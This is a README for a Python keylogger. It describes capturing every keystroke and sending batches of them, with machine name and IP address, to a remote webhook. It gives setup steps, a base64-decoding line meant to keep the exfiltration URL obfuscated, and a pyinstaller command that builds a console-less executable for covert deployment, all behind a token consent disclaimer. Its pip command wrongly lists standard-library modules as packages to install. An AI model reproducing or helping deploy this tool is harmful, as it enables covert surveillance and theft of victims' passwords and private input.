# Keylogger README

## Overview

This repository contains a Python script for a basic keylogger. A keylogger is a type of surveillance software that monitors and records keystrokes made by a user on a computer. This script specifically captures keyboard inputs and sends the recorded 
data to a remote server via a webhook URL.

---

**Disclaimer**: Keylogging is a sensitive activity and can be used for both legitimate and malicious purposes. Ensure that you use this script only in compliance with all applicable laws and regulations, and always obtain explicit consent from users before monitoring their keystrokes.

> * Warning *
Any damage caused by the use of this keylogger is entirely your responsibility. I am not liable for any misuse, damages, or legal consequences resulting from the use of this script. Use this tool responsibly and ensure compliance with all legal and ethical standards.

## Features

- **Keystroke Capture**: Listens for and records every key pressed by the user.
- **Asynchronous Data Transmission**: Sends recorded keystroke data to a specified server asynchronously.
- **System Information**: Includes machine name, IP address, and timestamp in the logs.

## Dependencies

The script relies on several Python libraries. If any of these libraries are missing, an `ImportError` will be raised:

- `base64`: For encoding and decoding data in base64 format.
- `json`: For converting between Python objects and JSON format.
- `asyncio`: For asynchronous programming and non-blocking operations.
- `socket`: For network-related operations such as fetching IP addresses.
- `requests`: For sending HTTP requests to the remote server.
- `logging`: For logging information and errors.
- `datetime`: For timestamping events.
- `pynput`: For capturing keyboard inputs.

Ensure these dependencies are installed in your Python environment.

## Setup

1. **Install Dependencies**

   Install the required libraries using pip:
   ```bash
   pip install base64 json asyncio socket requests logging pynput
   ```

2. **Configure the Webhook URL**

   The script uses a base64 encoded webhook URL for sending keystroke logs. Replace the base64 encoded URL with your own webhook endpoint. Decode and re-encode the URL as needed to maintain obfuscation.

3. **Update Webhook URL**

   In the script, find the `self.url` assignment in the `__init__` method and update it with your decoded webhook URL:
   ```python
   self.url = base64.b64decode("YOUR_BASE64_ENCODED_URL").decode("utf-8")
   ```

## Usage

1. **Run the Script**

   Execute the script to start logging keystrokes:
   ```bash
   python keylogger.py
   ```

2. **Logging**

   The script will start capturing keystrokes and logging them. It will send batches of recorded keystrokes to the remote server when the number of pressed keys exceeds 20.

3. **Viewing Logs**

   Logs are sent to the specified webhook URL. Check the server configured at this URL to view the captured keystrokes and other information.


# How To Build exe?
```bash
pyinstaller --onefile --name {INSERT_NAME} --noconsole run.py
```


## Security Considerations

- Ensure that the webhook URL is kept confidential and secure.
- Obtain consent from users before deploying the keylogger.
- Be aware of and comply with legal regulations regarding the use of keylogging software.

---

**Note**: This README provides a comprehensive guide to setting up and using the keylogger script. Ensure to use this tool responsibly and ethically.



